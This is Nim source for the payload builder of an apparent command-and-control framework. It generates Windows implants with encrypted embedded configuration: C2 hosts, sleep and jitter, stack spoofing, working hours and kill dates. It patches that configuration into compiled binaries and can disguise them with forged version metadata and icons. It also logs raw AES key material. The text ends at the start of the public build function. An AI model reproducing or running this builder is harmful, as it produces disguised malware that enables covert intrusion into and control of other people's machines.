import terminal, strformat, strutils, sequtils, tables, system, osproc, streams, os

import ../globals
import ../core/[logger, websocket]
import ../db/database
import ../../common/[utils, serialize, crypto]
import ../../types/[common, server, event]

const PLACEHOLDER = "PLACEHOLDER"
const IMPERATOR_ROOT* = CONQUEST_ROOT / "src" / "imperator"

# ---------------------------------------------------------------------------
# Monarch: serialize + encrypt agent configuration with AAD (sequence number)
# ---------------------------------------------------------------------------

proc serializeConfiguration(cq: Conquest, agentBuildInformation: AgentBuildInformation, listener: Listener, clientId: string = ""): seq[byte] =

    var packer = Packer.init()

    # Listener configuration
    packer.add(string.toUuid(listener.listenerId))

    case listener.listenerType:
    of LISTENER_HTTP:
        packer.addDataWithLengthPrefix(string.toBytes(listener.hosts))
    of LISTENER_SMB:
        packer.addDataWithLengthPrefix(string.toBytes(listener.pipe))

    # Sleep settings
    packer.add(agentBuildInformation.sleepSettings.sleepDelay)
    packer.add(agentBuildInformation.sleepSettings.jitter)
    packer.add(uint8(agentBuildInformation.sleepSettings.sleepTechnique))
    packer.add(uint8(agentBuildInformation.sleepSettings.spoofStack))

    # Working hours
    packer.add(uint8(agentBuildInformation.sleepSettings.workingHours.enabled))
    packer.add(uint32(agentBuildInformation.sleepSettings.workingHours.startHour))
    packer.add(uint32(agentBuildInformation.sleepSettings.workingHours.startMinute))
    packer.add(uint32(agentBuildInformation.sleepSettings.workingHours.endHour))
    packer.add(uint32(agentBuildInformation.sleepSettings.workingHours.endMinute))

    # Kill date
    packer.add(uint64(agentBuildInformation.killDate))

    # Public key for key exchange
    packer.addData(cq.keyPair.publicKey)

    # C2 profile
    packer.addDataWithLengthPrefix(string.toBytes(cq.profileString))

    let data = packer.pack()
    packer.reset()

    var aesKey = generateBytes(Key)
    let iv = generateBytes(Iv)

    let (encData, gmac) = encrypt(aesKey, iv, data)

    # Diagnostic: dump encryption material
    cq.info(fmt"[CRYPTO] Key[0..15]: {aesKey[0]:02x} {aesKey[1]:02x} {aesKey[2]:02x} {aesKey[3]:02x} {aesKey[4]:02x} {aesKey[5]:02x} {aesKey[6]:02x} {aesKey[7]:02x} {aesKey[8]:02x} {aesKey[9]:02x} {aesKey[10]:02x} {aesKey[11]:02x} {aesKey[12]:02x} {aesKey[13]:02x} {aesKey[14]:02x} {aesKey[15]:02x}")
    cq.info(fmt"[CRYPTO] Key[16..31]: {aesKey[16]:02x} {aesKey[17]:02x} {aesKey[18]:02x} {aesKey[19]:02x} {aesKey[20]:02x} {aesKey[21]:02x} {aesKey[22]:02x} {aesKey[23]:02x} {aesKey[24]:02x} {aesKey[25]:02x} {aesKey[26]:02x} {aesKey[27]:02x} {aesKey[28]:02x} {aesKey[29]:02x} {aesKey[30]:02x} {aesKey[31]:02x}")
    cq.info(fmt"[CRYPTO] IV[0..11]: {iv[0]:02x} {iv[1]:02x} {iv[2]:02x} {iv[3]:02x} {iv[4]:02x} {iv[5]:02x} {iv[6]:02x} {iv[7]:02x} {iv[8]:02x} {iv[9]:02x} {iv[10]:02x} {iv[11]:02x}")
    cq.info(fmt"[CRYPTO] Tag[0..15]: {gmac[0]:02x} {gmac[1]:02x} {gmac[2]:02x} {gmac[3]:02x} {gmac[4]:02x} {gmac[5]:02x} {gmac[6]:02x} {gmac[7]:02x} {gmac[8]:02x} {gmac[9]:02x} {gmac[10]:02x} {gmac[11]:02x} {gmac[12]:02x} {gmac[13]:02x} {gmac[14]:02x} {gmac[15]:02x}")
    cq.info(fmt"[CRYPTO] EncData len: {encData.len}, first bytes: {encData[0]:02x} {encData[1]:02x} {encData[2]:02x} {encData[3]:02x}")

    var xorSum: byte = 0
    var addSum: uint32 = 0
    for b in encData:
        xorSum = xorSum xor b
        addSum += b.uint32
    cq.info(fmt"[CRYPTO] EncData checksum: XOR={xorSum:02x}, SUM={addSum}")

    let lastIdx = encData.len - 16
    cq.info(fmt"[CRYPTO] EncData last 16: {encData[lastIdx]:02x} {encData[lastIdx+1]:02x} {encData[lastIdx+2]:02x} {encData[lastIdx+3]:02x} {encData[lastIdx+4]:02x} {encData[lastIdx+5]:02x} {encData[lastIdx+6]:02x} {encData[lastIdx+7]:02x} {encData[lastIdx+8]:02x} {encData[lastIdx+9]:02x} {encData[lastIdx+10]:02x} {encData[lastIdx+11]:02x} {encData[lastIdx+12]:02x} {encData[lastIdx+13]:02x} {encData[lastIdx+14]:02x} {encData[lastIdx+15]:02x}")

    packer.addData(aesKey)
    packer.addData(iv)
    packer.addData(gmac)
    packer.add(uint32(encData.len()))
    let encMaterial = packer.pack()

    wipeKey(aesKey)

    let finalConfig = encMaterial & encData

    cq.info(fmt"[CRYPTO] Final config len: {finalConfig.len}")
    cq.info(fmt"[CRYPTO] Final config[0..15]: {finalConfig[0]:02x} {finalConfig[1]:02x} {finalConfig[2]:02x} {finalConfig[3]:02x} {finalConfig[4]:02x} {finalConfig[5]:02x} {finalConfig[6]:02x} {finalConfig[7]:02x} {finalConfig[8]:02x} {finalConfig[9]:02x} {finalConfig[10]:02x} {finalConfig[11]:02x} {finalConfig[12]:02x} {finalConfig[13]:02x} {finalConfig[14]:02x} {finalConfig[15]:02x}")
    cq.info(fmt"[CRYPTO] Final config[32..47]: {finalConfig[32]:02x} {finalConfig[33]:02x} {finalConfig[34]:02x} {finalConfig[35]:02x} {finalConfig[36]:02x} {finalConfig[37]:02x} {finalConfig[38]:02x} {finalConfig[39]:02x} {finalConfig[40]:02x} {finalConfig[41]:02x} {finalConfig[42]:02x} {finalConfig[43]:02x} {finalConfig[44]:02x} {finalConfig[45]:02x} {finalConfig[46]:02x} {finalConfig[47]:02x}")
    cq.info(fmt"[CRYPTO] Final config[64..79]: {finalConfig[64]:02x} {finalConfig[65]:02x} {finalConfig[66]:02x} {finalConfig[67]:02x} {finalConfig[68]:02x} {finalConfig[69]:02x} {finalConfig[70]:02x} {finalConfig[71]:02x} {finalConfig[72]:02x} {finalConfig[73]:02x} {finalConfig[74]:02x} {finalConfig[75]:02x} {finalConfig[76]:02x} {finalConfig[77]:02x} {finalConfig[78]:02x} {finalConfig[79]:02x}")

    cq.info("Profile configuration serialized.")
    cq.sendBuildlogItem(LOG_INFO_SHORT, "Profile configuration serialized.", clientId = clientId)

    return finalConfig

# ---------------------------------------------------------------------------
# Imperator: serialize + encrypt without AAD (BCrypt-compatible, no seqnum)
# ---------------------------------------------------------------------------

proc serializeConfigurationNoAad(cq: Conquest, agentBuildInformation: AgentBuildInformation, listener: Listener, clientId: string = ""): seq[byte] =
    ## Serialize configuration for Imperator using AES-256 GCM without AAD

    var packer = Packer.init()

    packer.add(string.toUuid(listener.listenerId))
    packer.addDataWithLengthPrefix(string.toBytes(listener.hosts))

    packer.add(agentBuildInformation.sleepSettings.sleepDelay)
    packer.add(agentBuildInformation.sleepSettings.jitter)
    packer.add(uint8(agentBuildInformation.sleepSettings.sleepTechnique))
    packer.add(uint8(agentBuildInformation.sleepSettings.spoofStack))

    packer.add(uint8(agentBuildInformation.sleepSettings.workingHours.enabled))
    packer.add(uint32(agentBuildInformation.sleepSettings.workingHours.startHour))
    packer.add(uint32(agentBuildInformation.sleepSettings.workingHours.startMinute))
    packer.add(uint32(agentBuildInformation.sleepSettings.workingHours.endHour))
    packer.add(uint32(agentBuildInformation.sleepSettings.workingHours.endMinute))

    packer.add(uint64(agentBuildInformation.killDate))
    packer.addData(cq.keyPair.publicKey)
    packer.addDataWithLengthPrefix(string.toBytes(cq.profileString))

    let data = packer.pack()
    packer.reset()

    var aesKey = generateBytes(Key)
    let iv = generateBytes(Iv)

    let (encData, gmac) = encryptNoAad(aesKey, iv, data)

    cq.info(fmt"[CRYPTO] Key[0..15]: {aesKey[0]:02x} {aesKey[1]:02x} {aesKey[2]:02x} {aesKey[3]:02x} {aesKey[4]:02x} {aesKey[5]:02x} {aesKey[6]:02x} {aesKey[7]:02x} {aesKey[8]:02x} {aesKey[9]:02x} {aesKey[10]:02x} {aesKey[11]:02x} {aesKey[12]:02x} {aesKey[13]:02x} {aesKey[14]:02x} {aesKey[15]:02x}")
    cq.info(fmt"[CRYPTO] Key[16..31]: {aesKey[16]:02x} {aesKey[17]:02x} {aesKey[18]:02x} {aesKey[19]:02x} {aesKey[20]:02x} {aesKey[21]:02x} {aesKey[22]:02x} {aesKey[23]:02x} {aesKey[24]:02x} {aesKey[25]:02x} {aesKey[26]:02x} {aesKey[27]:02x} {aesKey[28]:02x} {aesKey[29]:02x} {aesKey[30]:02x} {aesKey[31]:02x}")
    cq.info(fmt"[CRYPTO] IV[0..11]: {iv[0]:02x} {iv[1]:02x} {iv[2]:02x} {iv[3]:02x} {iv[4]:02x} {iv[5]:02x} {iv[6]:02x} {iv[7]:02x} {iv[8]:02x} {iv[9]:02x} {iv[10]:02x} {iv[11]:02x}")
    cq.info(fmt"[CRYPTO] Tag[0..15]: {gmac[0]:02x} {gmac[1]:02x} {gmac[2]:02x} {gmac[3]:02x} {gmac[4]:02x} {gmac[5]:02x} {gmac[6]:02x} {gmac[7]:02x} {gmac[8]:02x} {gmac[9]:02x} {gmac[10]:02x} {gmac[11]:02x} {gmac[12]:02x} {gmac[13]:02x} {gmac[14]:02x} {gmac[15]:02x}")
    cq.info(fmt"[CRYPTO] EncData len: {encData.len}, first bytes: {encData[0]:02x} {encData[1]:02x} {encData[2]:02x} {encData[3]:02x}")

    var xorSum: byte = 0
    var addSum: uint32 = 0
    for b in encData:
        xorSum = xorSum xor b
        addSum += b.uint32
    cq.info(fmt"[CRYPTO] EncData checksum: XOR={xorSum:02x}, SUM={addSum}")

    let lastIdx = encData.len - 16
    cq.info(fmt"[CRYPTO] EncData last 16: {encData[lastIdx]:02x} {encData[lastIdx+1]:02x} {encData[lastIdx+2]:02x} {encData[lastIdx+3]:02x} {encData[lastIdx+4]:02x} {encData[lastIdx+5]:02x} {encData[lastIdx+6]:02x} {encData[lastIdx+7]:02x} {encData[lastIdx+8]:02x} {encData[lastIdx+9]:02x} {encData[lastIdx+10]:02x} {encData[lastIdx+11]:02x} {encData[lastIdx+12]:02x} {encData[lastIdx+13]:02x} {encData[lastIdx+14]:02x} {encData[lastIdx+15]:02x}")

    packer.addData(aesKey)
    packer.addData(iv)
    packer.addData(gmac)
    packer.add(uint32(encData.len()))
    let encMaterial = packer.pack()

    wipeKey(aesKey)

    let finalConfig = encMaterial & encData

    cq.info(fmt"[CRYPTO] Final config len: {finalConfig.len}")
    cq.info("Profile configuration serialized (NoAAD).")
    cq.sendBuildlogItem(LOG_INFO_SHORT, "Profile configuration serialized.", clientId = clientId)

    return finalConfig

# ---------------------------------------------------------------------------
# Monarch: compile
# ---------------------------------------------------------------------------

proc compile(cq: Conquest, placeholderLength: int, agentBuildInformation: AgentBuildInformation, listener: Listener, clientId: string = ""): string =

    let listenerType = ($listener.listenerType).toLowerAscii()
    let arch = if agentBuildInformation.architecture == ARCH_ARM64: "arm64" else: "x64"

    var ext: string = ""
    var additionalFlags: string = ""

    case agentBuildInformation.payloadType
    of EXE: ext = "exe"
    of SVC: ext = "svc.exe"
    of DLL:
        ext = "dll"
        additionalFlags = """
--app:lib
--nomain
--passL:"-static-libgcc -static-libstdc++ -Wl,-Bstatic -lpthread""""

    let configFile = fmt"{CONQUEST_ROOT}/src/agents/monarch/nim.cfg"
    let outFile = fmt"{CONQUEST_ROOT}/bin/monarch.{listenerType}_{arch}.{ext}"

    let nimblePath = getEnv("NIMBLE_PATH")
    let depsDir = if nimblePath != "": fmt"--nimblePath:{nimblePath}" else: ""
    let llvmMingwBin = fmt"{CONQUEST_ROOT}/bin/toolchains/llvm-mingw/bin"

    let buildCommand = case agentBuildInformation.architecture:
        of ARCH_X64:
            fmt"nim {depsDir} --os:windows --cpu:amd64 --gcc.exe:x86_64-w64-mingw32-gcc --gcc.linkerexe:x86_64-w64-mingw32-gcc -o:{outFile} c {CONQUEST_ROOT}/src/agents/monarch/main.nim"
        of ARCH_ARM64:
            fmt"nim -f {depsDir} --os:windows --cpu:arm64 -d:noRes --cc:clang --clang.exe:{llvmMingwBin}/aarch64-w64-mingw32-clang --clang.linkerexe:{llvmMingwBin}/aarch64-w64-mingw32-clang -o:{outFile} c {CONQUEST_ROOT}/src/agents/monarch/main.nim"

    # If caller supplied a custom nim.cfg, write it; otherwise generate one.
    # NOTE: placeholder padding uses "A"s only (not a second PLACEHOLDER token)
    # so that the patch proc can identify the real config slot via PLACEHOLDER+AAAA.
    # A trailing PLACEHOLDER would cause Nim to inline the suffix bytes with --mm:none.
    if agentBuildInformation.nimCfgContent.len > 0:
        writeFile(configFile, agentBuildInformation.nimCfgContent)
        cq.info("Applied custom nim.cfg content.")
        cq.sendBuildlogItem(LOG_INFO_SHORT, "Applied custom nim.cfg content.", clientId = clientId)
    else:
        let placeholder = PLACEHOLDER & "A".repeat(placeholderLength - len(PLACEHOLDER))
        let hideConsole = if not agentBuildInformation.verbose: ",-subsystem,windows" else: ""
        var config = fmt"""# Compiler flags
-d:agent
-d:release
--opt:size
--l:"-Wl,-s{hideConsole}"
{additionalFlags}
# Monarch agent configuration
-d:CONFIGURATION="{placeholder}"
-d:MODULES={$agentBuildInformation.modules}
-d:VERBOSE={$agentBuildInformation.verbose}
-d:TRANSPORT_{$(listener.listenerType)}
-d:PAYLOAD_{$(agentBuildInformation.payloadType)}"""
        writeFile(configFile, config)

        cq.info(fmt"Placeholder created ({placeholder.len()} bytes).")
        cq.sendBuildlogItem(LOG_INFO_SHORT, fmt"Placeholder created ({placeholder.len()} bytes).", clientId = clientId)

    cq.info(fmt"Compiling Monarch agent ({arch}).")
    cq.sendBuildlogItem(LOG_INFO_SHORT, fmt"Compiling Monarch ({arch})...", clientId = clientId)

    try:
        let process = startProcess("/bin/bash", args=["-c", buildCommand], options={poUsePath, poStdErrToStdOut})
        let outputStream = process.outputStream

        var line: string
        while outputStream.readLine(line):
            cq.output(line)

        let exitCode = process.waitForExit()

        if exitCode == 0:
            cq.info(fmt"Monarch {arch} payload generated successfully.")
            cq.sendBuildlogItem(LOG_INFO_SHORT, fmt"Monarch {arch} payload generated successfully.", clientId = clientId)
            return outFile
        else:
            cq.error("Build script exited with code ", $exitCode)
            cq.sendBuildlogItem(LOG_ERROR_SHORT, "Build script exited with code " & $exitCode, clientId = clientId)
            return ""

    except CatchableError as err:
        cq.error("An error occurred: ", err.msg)
        return ""

# ---------------------------------------------------------------------------
# Multi-location patch with AAAA-marker detection + full diagnostics
# ---------------------------------------------------------------------------

proc patch(cq: Conquest, unpatchedExePath: string, configuration: seq[byte], clientId: string = ""): seq[byte] =

    cq.info("Patching profile configuration into agent.")
    cq.sendBuildlogItem(LOG_INFO_SHORT, "Patching profile configuration into agent.", clientId = clientId)

    try:
        var exeBytes = readFile(unpatchedExePath)

        # Find ALL occurrences of "PLACEHOLDER" in the binary
        var allPositions: seq[int] = @[]
        var pos = 0
        while true:
            pos = exeBytes.find(PLACEHOLDER, pos)
            if pos == -1: break
            allPositions.add(pos)
            pos += 1

        cq.info(fmt"[PATCH] Found {allPositions.len} occurrences of 'PLACEHOLDER' in binary")
        for p in allPositions:
            if p >= 8:
                let prevEight = exeBytes[p - 8 .. p - 1]
                cq.info(fmt"[PATCH]   - 0x{p:08X} preceded by: {prevEight[0].byte:02x} {prevEight[1].byte:02x} {prevEight[2].byte:02x} {prevEight[3].byte:02x} {prevEight[4].byte:02x} {prevEight[5].byte:02x} {prevEight[6].byte:02x} {prevEight[7].byte:02x}")
            if p + PLACEHOLDER.len + 8 <= exeBytes.len:
                let nextEight = exeBytes[p + PLACEHOLDER.len .. p + PLACEHOLDER.len + 7]
                cq.info(fmt"[PATCH]             followed by: {nextEight[0].byte:02x} {nextEight[1].byte:02x} {nextEight[2].byte:02x} {nextEight[3].byte:02x} {nextEight[4].byte:02x} {nextEight[5].byte:02x} {nextEight[6].byte:02x} {nextEight[7].byte:02x} ({nextEight})")

        # Identify the real config slot: PLACEHOLDER immediately followed by "AAAA"
        # (as opposed to the literal PLACEHOLDER string that may appear elsewhere)
        var positions: seq[int] = @[]
        for p in allPositions:
            if p + PLACEHOLDER.len + 4 <= exeBytes.len:
                let nextFour = exeBytes[p + PLACEHOLDER.len .. p + PLACEHOLDER.len + 3]
                if nextFour == "AAAA":
                    positions.add(p)
                    cq.info(fmt"[PATCH] Position 0x{p:08X} is a placeholder START (PLACEHOLDER+AAAA marker)")

        if positions.len == 0:
            raise newException(CatchableError, "No placeholder start patterns found (PLACEHOLDER+AAAA).")

        cq.info(fmt"[PATCH] Will patch {positions.len} location(s)")

        let configStr = Bytes.toString(configuration)
        cq.info(fmt"[PATCH] Config seq len: {configuration.len}, string len: {configStr.len}")
        cq.info(fmt"[PATCH] Last 4 config bytes: {configuration[^4]:02x} {configuration[^3]:02x} {configuration[^2]:02x} {configuration[^1]:02x}")

        for placeholderPos in positions:
            cq.info(fmt"[PATCH] Patching at offset 0x{placeholderPos:08X}")
            for i, c in configStr:
                exeBytes[placeholderPos + i] = c
            cq.info(fmt"[PATCH] Last 4 bytes after patch: {exeBytes[placeholderPos + configuration.len - 4].byte:02x} {exeBytes[placeholderPos + configuration.len - 3].byte:02x} {exeBytes[placeholderPos + configuration.len - 2].byte:02x} {exeBytes[placeholderPos + configuration.len - 1].byte:02x}")

        # Post-patch verification: any remaining unpatched PLACEHOLDER?
        var lderPos = 0
        var lderCount = 0
        while true:
            lderPos = exeBytes.find("LDER", lderPos)
            if lderPos == -1: break
            if lderPos >= 7 and exeBytes[lderPos - 7 .. lderPos - 1] == "PLACEHO":
                cq.info(fmt"[PATCH] WARNING: Found unpatched PLACEHOLDER ending at 0x{lderPos + 3:08X}")
                lderCount += 1
            lderPos += 1

        if lderCount > 0:
            cq.info(fmt"[PATCH] ERROR: {lderCount} unpatched PLACEHOLDER(s) remain!")
        else:
            cq.info("[PATCH] Verification OK: no unpatched PLACEHOLDERs found")

        # Diagnostic: PLACEHOLDERAAAA still present?
        let diagPattern = PLACEHOLDER & "AAAA"
        var diagPos = 0; var diagCount = 0
        while true:
            diagPos = exeBytes.find(diagPattern, diagPos)
            if diagPos == -1: break
            cq.info(fmt"[PATCH] DIAGNOSTIC: Still found 'PLACEHOLDERAAAA' at 0x{diagPos:08X}")
            diagCount += 1; diagPos += 1
        cq.info(fmt"[PATCH] DIAGNOSTIC: Total 'PLACEHOLDERAAAA' patterns after patch: {diagCount}")

        let configFirst8 = configStr[0..7]
        var cfgPos = 0; var cfgCount = 0
        while true:
            cfgPos = exeBytes.find(configFirst8, cfgPos)
            if cfgPos == -1: break
            cq.info(fmt"[PATCH] DIAGNOSTIC: Config first 8 bytes found at 0x{cfgPos:08X}")
            cfgCount += 1; cfgPos += 1
        cq.info(fmt"[PATCH] DIAGNOSTIC: Config first 8 bytes appear {cfgCount} time(s)")

        writeFile(unpatchedExePath, exeBytes)

        # Read-back verification
        let verifyBytes = readFile(unpatchedExePath)
        let verifyPos = verifyBytes.find("LDER")
        if verifyPos != -1 and verifyPos >= 7 and verifyBytes[verifyPos - 7 .. verifyPos - 1] == "PLACEHO":
            cq.info(fmt"[PATCH] CRITICAL ERROR: File on disk still contains PLACEHOLDER at 0x{verifyPos - 7:08X}!")

        for patchPos in positions:
            let endOffset = patchPos + configuration.len - 4
            cq.info(fmt"[PATCH] Disk verify at 0x{patchPos:08X} last 4 bytes: {verifyBytes[endOffset].byte:02x} {verifyBytes[endOffset+1].byte:02x} {verifyBytes[endOffset+2].byte:02x} {verifyBytes[endOffset+3].byte:02x}")
            let ctStart = patchPos + 64
            if ctStart + 16 <= verifyBytes.len:
                cq.info(fmt"[PATCH] Disk ciphertext[0..15] at 0x{ctStart:08X}: {verifyBytes[ctStart].byte:02x} {verifyBytes[ctStart+1].byte:02x} {verifyBytes[ctStart+2].byte:02x} {verifyBytes[ctStart+3].byte:02x} {verifyBytes[ctStart+4].byte:02x} {verifyBytes[ctStart+5].byte:02x} {verifyBytes[ctStart+6].byte:02x} {verifyBytes[ctStart+7].byte:02x} {verifyBytes[ctStart+8].byte:02x} {verifyBytes[ctStart+9].byte:02x} {verifyBytes[ctStart+10].byte:02x} {verifyBytes[ctStart+11].byte:02x} {verifyBytes[ctStart+12].byte:02x} {verifyBytes[ctStart+13].byte:02x} {verifyBytes[ctStart+14].byte:02x} {verifyBytes[ctStart+15].byte:02x}")

        cq.success(fmt"Agent payload patched successfully: {unpatchedExePath}.")
        cq.sendBuildlogItem(LOG_SUCCESS_SHORT, fmt"Agent payload patched successfully: {unpatchedExePath}.", clientId = clientId)
        return string.toBytes(exeBytes)

    except CatchableError as err:
        cq.error("An error occurred: ", err.msg)
        cq.sendBuildlogItem(LOG_ERROR_SHORT, "An error occurred: " & err.msg, clientId = clientId)

    return @[]

# ---------------------------------------------------------------------------
# Imperator helpers
# ---------------------------------------------------------------------------

proc filterDynamicDefines(content: string): string =
    ## Strip auto-generated lines so they can be rewritten cleanly
    var lines: seq[string]
    for line in content.splitLines():
        if line.startsWith("-d:CONFIGURATION") or
           line.startsWith("-d:malDebug") or
           line.startsWith("-d:dll"):
            continue
        if line.contains("Encrypted configuration placeholder") or
           line.contains("Dynamic build configuration"):
            continue
        lines.add(line)
    return lines.join("\n")

proc updateImperatorNimCfg(cq: Conquest, placeholderLength: int, agentBuildInformation: AgentBuildInformation, clientId: string = ""): bool =
    let cfgPath = fmt"{IMPERATOR_ROOT}/nim.cfg"
    try:
        var cfg = readFile(cfgPath)
        cfg = filterDynamicDefines(cfg)

        let placeholder = PLACEHOLDER & "A".repeat(placeholderLength - len(PLACEHOLDER))
        var dynamicLines = @[
            "",
            "# Dynamic build configuration (auto-generated)",
            fmt"-d:CONFIGURATION=""{placeholder}"""
        ]
        if agentBuildInformation.verbose:
            dynamicLines.add("-d:malDebug")
        if agentBuildInformation.payloadType == DLL:
            dynamicLines.add("-d:dll")

        cfg &= dynamicLines.join("\n") & "\n"
        writeFile(cfgPath, cfg)

        cq.info(fmt"Placeholder created ({placeholder.len} bytes).")
        cq.sendBuildlogItem(LOG_INFO_SHORT, fmt"Placeholder created ({placeholder.len} bytes).", clientId = clientId)
        return true

    except CatchableError as err:
        cq.error("Failed to update Imperator nim.cfg: ", err.msg)
        return false

proc generateResourceFile(cq: Conquest, metadata: BinaryMetadata, outputPath: string): bool =
    try:
        let fileVerComma = if metadata.fileVersion.len > 0: metadata.fileVersion.replace(".", ",") else: "1,0,0,0"
        let prodVerComma = if metadata.productVersion.len > 0: metadata.productVersion.replace(".", ",") else: "1,0,0,0"

        var rcContent = "// Auto-generated resource file\n"

        if metadata.iconPath != "None" and metadata.iconPath.len > 0:
            rcContent &= fmt"""
1 ICON "{metadata.iconPath}"
"""

        if metadata.productName.len > 0 or metadata.fileDescription.len > 0:
            rcContent &= fmt"""
1 VERSIONINFO
FILEVERSION {fileVerComma}
PRODUCTVERSION {prodVerComma}
FILEFLAGSMASK 0x3fL
FILEFLAGS 0x0L
FILEOS 0x40004L
FILETYPE 0x1L
FILESUBTYPE 0x0L
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904b0"
        BEGIN
            VALUE "CompanyName", "{metadata.companyName}"
            VALUE "FileDescription", "{metadata.fileDescription}"
            VALUE "FileVersion", "{metadata.fileVersion}"
            VALUE "InternalName", "{metadata.originalFilename}"
            VALUE "LegalCopyright", "{metadata.copyright}"
            VALUE "OriginalFilename", "{metadata.originalFilename}"
            VALUE "ProductName", "{metadata.productName}"
            VALUE "ProductVersion", "{metadata.productVersion}"
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x409, 1200
    END
END
"""
        writeFile(outputPath, rcContent)
        cq.info(fmt"Resource file generated: {outputPath}")
        return true

    except CatchableError as err:
        cq.error(fmt"Failed to generate resource file: {err.msg}")
        return false

proc compileResourceFile(cq: Conquest, rcPath: string, resPath: string, architecture: Architecture = ARCH_X64): bool =
    try:
        let windres = case architecture:
            of ARCH_X64: "x86_64-w64-mingw32-windres"
            of ARCH_ARM64: fmt"{CONQUEST_ROOT}/bin/toolchains/llvm-mingw/bin/aarch64-w64-mingw32-windres"
        let cmd = fmt"{windres} {rcPath} -O coff -o {resPath}"
        cq.info(fmt"Compiling resource: {cmd}")

        let (output, exitCode) = execCmdEx(cmd)
        if exitCode != 0:
            cq.error(fmt"windres failed: {output}")
            return false

        cq.info("Resource file compiled successfully")
        return true

    except CatchableError as err:
        cq.error(fmt"Failed to compile resource file: {err.msg}")
        return false

proc compileImperator(cq: Conquest, agentBuildInformation: AgentBuildInformation, resPath: string = "", clientId: string = ""): string =
    let extension = if agentBuildInformation.payloadType == DLL: ".dll" else: ".exe"
    let archStr = if agentBuildInformation.architecture == ARCH_ARM64: "arm64" else: "x64"
    let outFile = fmt"{CONQUEST_ROOT}/bin/imperator.{archStr}{extension}"
    let formatStr = if agentBuildInformation.payloadType == DLL: "DLL" else: "EXE"

    cq.info(fmt"Compiling Imperator agent ({formatStr}, {archStr}).")
    cq.sendBuildlogItem(LOG_INFO_SHORT, fmt"Compiling Imperator ({formatStr}, {archStr})...", clientId = clientId)

    try:
        var buildCmd = fmt"cd {IMPERATOR_ROOT} && nim c -f -o:{outFile}"

        case agentBuildInformation.architecture:
        of ARCH_X64:
            buildCmd &= " --cpu:amd64"
        of ARCH_ARM64:
            let llvmBin = fmt"{CONQUEST_ROOT}/bin/toolchains/llvm-mingw/bin"
            buildCmd &= " --cpu:arm64"
            buildCmd &= fmt" --gcc.exe:{llvmBin}/aarch64-w64-mingw32-gcc"
            buildCmd &= fmt" --gcc.linkerexe:{llvmBin}/aarch64-w64-mingw32-gcc"

        if agentBuildInformation.payloadType == DLL:
            buildCmd &= " --passL:-shared --passL:-Wl,-eDllMain"

        if resPath.len > 0 and fileExists(resPath):
            buildCmd &= fmt" --passL:{resPath}"
            cq.info(fmt"Including resource file: {resPath}")

        if cq.profilePath.len > 0:
            let absProfilePath = if cq.profilePath.isAbsolute: cq.profilePath
                                 else: CONQUEST_ROOT / cq.profilePath
            buildCmd &= fmt" -d:profilePath={absProfilePath}"
            cq.info(fmt"Using profile: {absProfilePath}")

        buildCmd &= " src/main.nim"

        let process = startProcess("/bin/bash", args=["-c", buildCmd], options={poUsePath, poStdErrToStdOut})
        let outputStream = process.outputStream

        var line: string
        while outputStream.readLine(line):
            cq.output(line)

        let exitCode = process.waitForExit()

        if exitCode == 0:
            cq.info(fmt"Imperator {formatStr} payload generated successfully.")
            cq.sendBuildlogItem(LOG_INFO_SHORT, fmt"Imperator {formatStr} payload generated successfully.", clientId = clientId)
            return outFile
        else:
            cq.error("Imperator build failed with code ", $exitCode)
            cq.sendBuildlogItem(LOG_ERROR_SHORT, "Build failed with code " & $exitCode, clientId = clientId)
            return ""

    except CatchableError as err:
        cq.error("An error occurred: ", err.msg)
        return ""

proc imperatorAgentBuild(cq: Conquest, agentBuildInformation: AgentBuildInformation, clientId: string = ""): tuple[name: string, payload: seq[byte]] =
    let archStr = if agentBuildInformation.architecture == ARCH_ARM64: "ARM64" else: "x64"

    cq.info(fmt"Building Imperator agent ({archStr})...")
    cq.sendBuildlogItem(LOG_INFO_SHORT, fmt"Building Imperator agent ({archStr})...", clientId = clientId)

    if not cq.dbListenerExists(agentBuildInformation.listenerId):
        cq.error(fmt"Listener {agentBuildInformation.listenerId} does not exist.")
        return

    let listener = cq.listeners[agentBuildInformation.listenerId]

    var config = cq.serializeConfigurationNoAad(agentBuildInformation, listener, clientId)
    cq.info(fmt"Configuration size: {config.len} bytes")
    cq.sendBuildlogItem(LOG_INFO_SHORT, fmt"Configuration serialized ({config.len} bytes).", clientId = clientId)

    if agentBuildInformation.nimCfgContent.len > 0:
        let cfgPath = fmt"{IMPERATOR_ROOT}/nim.cfg"
        let cleanedCfg = filterDynamicDefines(agentBuildInformation.nimCfgContent)
        writeFile(cfgPath, cleanedCfg)
        cq.info("Applied custom nim.cfg content.")
        cq.sendBuildlogItem(LOG_INFO_SHORT, "Applied custom nim.cfg content.", clientId = clientId)

    if not cq.updateImperatorNimCfg(config.len(), agentBuildInformation, clientId):
        return

    # Optionally generate a Windows resource file (metadata + icon)
    var resPath = ""
    let metadata = agentBuildInformation.metadata
    if metadata != nil and
       (metadata.productName.len > 0 or metadata.fileDescription.len > 0 or
        (metadata.iconPath != "None" and metadata.iconPath.len > 0)):

        let tempDir = fmt"{CONQUEST_ROOT}/temp"
        if not dirExists(tempDir):
            createDir(tempDir)

        let rcPath = fmt"{tempDir}/resource.rc"
        resPath = fmt"{tempDir}/resource.res"

        var resolvedMetadata = metadata
        if not metadata.useCustomIcon and metadata.iconPath != "None" and metadata.iconPath.len > 0:
            let iconName = metadata.iconPath.toLowerAscii()
            resolvedMetadata.iconPath = fmt"{CONQUEST_ROOT}/resources/icons/{iconName}.ico"
            cq.info(fmt"Using predefined icon: {resolvedMetadata.iconPath}")

        if not cq.generateResourceFile(resolvedMetadata, rcPath):
            cq.sendBuildlogItem(LOG_ERROR_SHORT, "Failed to generate resource file", clientId = clientId)
            return

        if not cq.compileResourceFile(rcPath, resPath, agentBuildInformation.architecture):
            cq.sendBuildlogItem(LOG_ERROR_SHORT, "Failed to compile resource file", clientId = clientId)
            return

        cq.sendBuildlogItem(LOG_INFO_SHORT, "Resource file compiled.", clientId = clientId)

    let outPath = cq.compileImperator(agentBuildInformation, resPath, clientId)
    if outPath.isEmptyOrWhitespace():
        return

    return (outPath.extractFilename(), cq.patch(outPath, config, clientId))

# ---------------------------------------------------------------------------
# Public entry point
# ---------------------------------------------------------------------------

proc agentBuild*(cq: Conquest, agentBuildInformation: AgentBuildInformation, clientId: string = ""): tuple[name: string, payload: seq[byte]] =

    cq.info(fmt"agentBuild: agentType={agentBuildInformation.agentType}, arch={agentBuildInformation.architecture}")
